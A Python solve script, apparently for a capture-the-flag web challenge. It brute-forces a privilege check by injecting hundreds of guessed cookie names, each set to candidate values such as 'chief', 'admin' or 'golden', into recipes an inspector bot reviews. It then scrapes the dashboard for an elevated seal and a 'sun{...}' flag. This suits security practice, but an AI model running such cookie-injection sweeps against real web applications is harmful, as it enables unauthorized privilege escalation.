#!/usr/bin/env python3
"""Sweep the VALUE axis of the inspector's cookie jar.

The previous 1255-name sweep pinned the value to {chief, inspector, true}. That only tests
rules like `req.cookies.X === 'chief'`; it cannot see `=== 'golden'`, `=== 'the_chief'`,
`=== recipe.title`, or any hardcoded staff passphrase, and the mixer gives us a much bigger
batch than one cookie per submit: 290 names can ride along with a single value in one
verdict request. So each batch below puts the SAME value on every candidate name, with the
recipe title set to that value too (which also covers rules that compare a cookie against
the batch's own fields). A golden seal on any of these names the (name, value) pair, and
the batches stay under 12 KB so they are actually stamped instead of jammed.
"""
import re
import sys
import time

from cc import new_baker

ROOTS = """role user_role userrole roles usertype type kind level tier rank group staff
admin isadmin is_admin permission permissions privilege privileges clearance authority auth
seal seallevel seal_level sealtype golden gold goldseal golden_seal chief headchief
head_chief thechief the_chief chef inspector inspector_role quality_inspector supervisor
foreman manager director owner boss ceo founder president baker master grandmaster legend
legendary approved certified verified trusted internal privileged override bypass debug dev
mode review review_level reviewlevel reviewer verdict decision outcome stamped sealed
status state badge token sess session csrf signature hmac apikey api_key secret salt
mixer drum tray dough batch recipe ingredient cookie cookies cc cookiecorp orbital sector
city moon sugar sprinkles star dust solar cosmic quantum plasma gravity comet vanilla
cocoa honey who actor principal identity sub iss aud xr ccrole cc_role ccseal clevel
x_role xrole xlevel x-seal xseal priority scope grant granted reviewer_role reviewed_by
sealed_by sealedby approved_by approvedby stamp_level authority_level
"""
VALUES = ["chief", "Chief", "CHIEF", "the_chief", "head_chief", "cookiecorp_chief",
          "inspector", "quality_inspector", "admin", "root", "system", "staff",
          "golden", "gold", "GOLDEN", "golden_seal", "legendary", "master",
          "certified", "approved", "verified", "trusted", "true", "1", "yes", "on",
          "robot", "cookiecorp", "confectionery", "1962", "sector7", "brighter_tomorrow",
          "sun", "reviewed", "sealed", "signed", "granted"]


def names():
    out, seen = [], set()
    for r in ROOTS.split():
        for cand in (r, r.replace("_", "-"), r.replace("_", "")):
            for c in (cand, cand.upper(), cand.capitalize()):
                if c and c not in seen and len(c) <= 40:
                    seen.add(c)
                    out.append(c)
    return out


ALLN = names()[:290]


def log(*a):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), " ".join(str(x) for x in a))
    sys.stdout.buffer.write((line + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def state(c, rid):
    code, dash, dt = c.get("/dashboard")
    blk = re.search(r"<tr>(?:(?!</tr>).)*?%s(?:(?!</tr>).)*?</tr>" % rid, dash or "", re.S)
    if not blk:
        return "norow", "?"
    b = blk.group(0)
    st = re.search(r'class="pill (\w+)">(\w+)</span>', b)
    tail = " ".join(re.sub(r"<[^>]+>", " ", b.split("</span>")[-1]).split())
    return ("NONE" if "&mdash;" in tail else ("standard" if "standard" in tail else tail[:30]),
            st.group(2) if st else "?")


log("names per batch: %d, values: %d -> %d batches" % (len(ALLN), len(VALUES), len(VALUES)))
u, c, _ = new_baker("vw")
made = 0
for v in VALUES:
    if made >= 9:
        u, c, _ = new_baker("vw")
        made = 0
        log("new user %s" % u)
    ings, used, total = [], set(), 0
    for n in ALLN:
        if n in used:
            continue
        if total + len(n) + 1 + len(v) + 2 > 12200:
            break
        used.add(n)
        ings.append({"name": n, "value": v})
        total += len(n) + 1 + len(v) + 2
    code, out, dt = c.post("/api/recipe", {"title": v, "ingredients": ings})
    rid = out.get("id") if isinstance(out, dict) else None
    if not rid:
        log("  %-20s save -> %s %s" % (v, code, str(out)[:60]))
        continue
    made += 1
    for k in range(15):
        sc, so, _ = c.post("/api/recipe/%s/submit" % rid, {})
        if isinstance(so, dict) and so.get("ok"):
            break
        time.sleep(6)
    seal = stt = ""
    for k in range(14):
        time.sleep(5)
        seal, stt = state(c, rid)
        if stt == "reviewed":
            break
    log("  value=%-20s %s %d cookies %5dB -> %s %s" % (v, rid[:8], len(ings), total, stt, seal))
    if seal not in ("standard", "NONE"):
        code, page, _ = c.get("/recipe/%s" % rid)
        open("../files/golden_value_%s.html" % re.sub(r"\W", "_", v), "w",
             encoding="utf-8").write(str(page))
        fl = re.findall(r"sun\{[^{}\r\n]{1,200}\}", str(page))
        log("      !!! value=%r -> %s flag=%s" % (v, seal, fl))
        if fl:
            open("../flag.txt", "w", encoding="utf-8").write(fl[0] + "\n")
            sys.exit(0)
log("value sweep done")
